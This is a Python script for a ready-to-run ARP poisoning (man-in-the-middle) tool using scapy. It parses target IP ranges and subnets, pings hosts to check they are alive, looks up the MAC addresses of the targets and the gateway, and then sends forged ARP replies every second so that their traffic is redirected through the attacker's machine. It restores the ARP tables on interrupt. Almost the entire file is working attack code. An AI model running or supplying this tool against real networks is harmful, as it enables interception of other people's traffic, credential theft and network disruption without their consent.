#!/usr/bin/env python
from scapy.all import *
import sys
import netifaces
import argparse
import ipaddress
import pythonping
import threading

parser = argparse.ArgumentParser(description='ARP Poisoning Tool')
parser.add_argument('-i', '--interface', help='Interface to send packets through', required=False)
parser.add_argument('-t', '--targets', help='IP address of target hosts', required=True)
parser.add_argument('-g', '--gateway', help='IP address of gateway', required=False)
parser.add_argument('-e', '--exclude', help='IP address of hosts to exclude from poisoning', required=False)
args = parser.parse_args()

if not args.interface:
    interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
else:
    interface = args.interface
conf.iface = interface
conf.verb = 0

class Host:
    def __init__(self, ip):
        self.ip = ip
        self.is_alive = False
        self.mac = None
        self.poison_packets = None # ARP packets to poison target [target, gateway]

def get_attackers_ip(interface):
    ifaddresses = netifaces.ifaddresses(interface)
    ip_address = ifaddresses[netifaces.AF_INET]
    return ip_address[0]['addr']

def ip_translator(ip):
    '''
    Translates a given ip, ip range or subnet to a list of ips
    ip: str
    return: list of Ip objects
    '''
    if "," in ip:
        # Ip is a list of ips or ip ranges or subnets
        # Translate each ip, ip range or subnet to a list of ips
        _ips = ip.split(",")
        for i in range(len(_ips)):
            _ips[i] = ip_translator(_ips[i].strip())
        ips = []
        for _ip in _ips:
            ips.extend(_ip)
        return ips

    elif "-" in ip:
        # Ip is a range (hopefully without broadcast and network ip)
        ip = ip.split("-")
        ips = []
        for i in range(int(ip[0].split(".")[-1]), int(ip[1].split(".")[-1]) + 1):
            ips.append(Host(".".join(ip[0].split(".")[:-1]) + "." + str(i)))
        return ips
    elif "/" in ip:
        # Ip is a subnet
        _ips = ipaddress.ip_network(ip)
        ips = [Host(str(ip)) for ip in _ips]
        # remove broadcast ip
        ips.pop()
        # remove network ip
        ips.pop(0)
        return ips
    else:
        # Ip is a single ip (hopefully not a broadcast or network ip)
        return [Host(ip)]

def check_if_alive(ips):
    '''
    Checks if a list of Ip objects is alive
    ips: list of Ip objects
    return: None
    '''
    TIMEOUT = 3
    def ping(ip):
        response_list = pythonping.ping(ip.ip, timeout=TIMEOUT, count=1)
        if response_list.rtt_avg_ms < TIMEOUT*1000:
            ip.is_alive = True
        else:
            ip.is_alive = False
    threads = []
    for ip in ips:
        t = threading.Thread(target=ping, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def get_mac_address_of_interface(interface):
    ifaddresses = netifaces.ifaddresses(interface)
    link_layer_address = ifaddresses[netifaces.AF_LINK]
    return link_layer_address[0]['addr']

def restore_targets(gateway_ip, gateway_mac, targets):
    print("[*] Restoring targets...")
    for target in targets:
        if target.is_alive:
            sendp(ARP(op=2, psrc=gateway_ip, pdst=target.ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=3)
            sendp(ARP(op=2, psrc=target.ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target.mac), count=3)

def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, targets):
    for target in targets:
        _poison_target = ARP()
        _poison_target.op = 2
        _poison_target.psrc = gateway_ip
        _poison_target.pdst = target.ip
        _poison_target.hwdst = target.mac
        _poison_target.hwsrc = attacker_mac

        _poison_gateway = ARP()
        _poison_gateway.op = 2
        _poison_gateway.psrc = target.ip
        _poison_gateway.pdst = gateway_ip
        _poison_gateway.hwdst = gateway_mac
        _poison_gateway.hwsrc = attacker_mac

        target.poison_packets = [_poison_target, _poison_gateway]

    print(f"[*] Beginning the ARP poison on {online_targets} targets. [CTRL-C to stop]")

    while True:
        for target in targets:
            if target.is_alive:
                send(target.poison_packets[0])
                send(target.poison_packets[1])
        time.sleep(1)

attacker_mac = get_mac_address_of_interface(interface)

if not args.gateway:
    gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
else:
    gateway_ip = args.gateway

targets = ip_translator(args.targets)
excludes = ip_translator(args.exclude) if args.exclude else []
excludes.append(Host(get_attackers_ip(interface)))
excludes.append(Host(gateway_ip))
_exclude_ips = [item.ip for item in excludes]
targets = [item for item in targets if item.ip not in _exclude_ips]
del _exclude_ips

check_if_alive(targets)

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Make sure the gateway address is right. Exiting.")
    sys.exit(0)
print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

for target in targets:
    if target.is_alive:
        target_mac = get_mac(target.ip)
        if not target_mac:
            print(f"[!] Unable to get MAC address for {target.ip}")
            target.is_alive = False
        else:
            target.mac = target_mac

online_targets = len([target for target in targets if target.is_alive])
if online_targets == 0:
    print("[!] Non of the targets are online. Exiting.")
    sys.exit(0)
    
try:
    poison_target(gateway_ip, gateway_mac, targets)
except KeyboardInterrupt:
    restore_targets(gateway_ip, gateway_mac, targets)
    print("[*] Exiting program.")
    sys.exit(0)